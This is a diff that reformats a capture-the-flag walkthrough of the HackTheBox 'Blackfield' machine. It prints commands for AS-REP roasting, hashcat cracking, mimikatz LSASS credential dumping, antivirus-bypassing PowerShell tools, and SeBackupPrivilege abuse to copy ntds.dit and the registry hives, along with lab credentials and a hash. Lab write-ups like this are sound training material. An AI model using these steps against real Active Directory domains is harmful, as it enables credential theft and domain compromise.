@@ -42,13 +42,17 @@ Several interesting ports are available for further enumeration as observed from
 
 (ii) Smb Enumeration on port 445
 
-    smbclient -L //10.10.10.192 -N
+
+ ```ruby
+smbclient -L //10.10.10.192 -N
+```
 
 ![](/images/black3.png)
   The following shares were available, however, only **profiles$** share was accessible
-     
-     smbclient //10.10.10.192/profiles$ -N
-
+   
+ ```ruby 
+    smbclient //10.10.10.192/profiles$ -N
+```
 ![](/images/black4.png)
 Some Interesting folders found were discovered here, and they seemed to be named after user accounts
 The next step was copying these names in a text file, then checking the content of the folders using **“recurse”** command.
@@ -60,12 +64,17 @@ For further reading on kerberos preauth, click on the link below
 http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm#UF_DONT_REQUIRE_PREAUTH
 So moving on to using the badboy script(getnpusers.py), A tgt ticket was found for user support account
 
-     python3 GetNPUsers.py BLACKFIELD.local/ -usersfile /home/osboxes/boxes/blackfield/user.txt -dc-ip 10.10.10.192
- ![](/images/black6.png)
+```ruby
+   python3 GetNPUsers.py BLACKFIELD.local/ -usersfile /home/osboxes/boxes/blackfield/user.txt -dc-ip 10.10.10.192
+``` 
+
+![](/images/black6.png)
 ![](/images/black7.png)
   After getting the hash above, **hash cat** was used to crack it using the command below
 
+```ruby
      hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+```
 ![](/images/black8.png)
 **user:support**
 **password:#00^BlackKnight**     
@@ -93,13 +102,15 @@ Lets try changing password of account audit2020 and yes we can
 
    ![](/images/black14.png)
   The following command was run    
-    
+  ```ruby 
     sekurlsa::minidump lsass.dmp
-   ![](/images/black15.png)
-then ...
- 
+```   
+![](/images/black15.png)
+then 
+ ```ruby
     'sekurlsa::logonPasswords full'
-   ![](/images/black16.png)
+```   
+![](/images/black16.png)
      and svc_backup account **hash(9658d1d1dcd9250115e2205d9f48400d)** was found,
      then using evilwinrm, logged in using the above credentials and Voila!we have the user flag.
      
@@ -123,17 +134,19 @@ A txt file was found on the **C:** directory and in it was a clue,  that the use
     **-->SharpHound**\
     On this second tool, the following commands were ran
      
-     
+   ```ruby  
     Powershell -exec bypass
      Import-module SharpHound.ps1
- ![](/images/black21.png)
+``` 
+![](/images/black21.png)
      as you can see in the above image, sharphound was blocked by the antivirus , this explains the sudden disappearnace of the winpeas.exe as well.\
      **-->Powerup**\
   On this third tool, the following commands were ran
-     
+   
+```ruby  
      Import-Module ./powerup.ps1
      Invoke-AllChecks
-    
+ ```
  ![](/images/black22.png)
 As you can see above, the user can backup and restore things.
 After an online search on attack vectors on these, it led me to the following links;   
@@ -141,20 +154,20 @@ After an online search on attack vectors on these, it led me to the following li
      https://docs.datacore.com/WIK-WebHelp/VSS/DiskShadow_Commands_Example.htm\
      From the two links above, came up with the following script 
      
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+```ruby
 set context persistent nowriters#
 add volume c: alias new1#
 create#
 expose %new1% z:#
+```
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 The script was then uploaded  to the server
 ![](/images/black23.png)
      
 Then the script was ran using the command below.
-
+```ruby
     cmd /c diskshadow /s script.txt
-
+```
 
      
 The shadow copy was successfully created and exposed as partition ‘Z’
@@ -170,15 +183,15 @@ The shadow copy was successfully created and exposed as partition ‘Z’
  ![](/images/black26.png)
   The reason why we used these two dlls was based on the constant that, **if you want to read/copy data out of a "normally forbidden" folder, you have to act as a backup software**.
     Using the function below, we simulated a backup software,,however you are required to have the privileges to perform that task
-    
+   ```ruby 
     Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit c:\tmp\ntds.dit 
-
-    ![](/images/black27.png)
+```
+   ![](/images/black27.png)
   After the above was successfully executed, ran the following commands  from the tmp folder, which extracted the **system.hive** and **sam.hive** files from the backed up ntds.dit files
-    
+   ```ruby 
     reg save HKLM\SYSTEM c:\tmp\system.hive
     reg save HKLM\SAM c:\tmp\sam.hive
-
+```
 ![](/images/black28.png)
 ![](/images/black29.png)
     
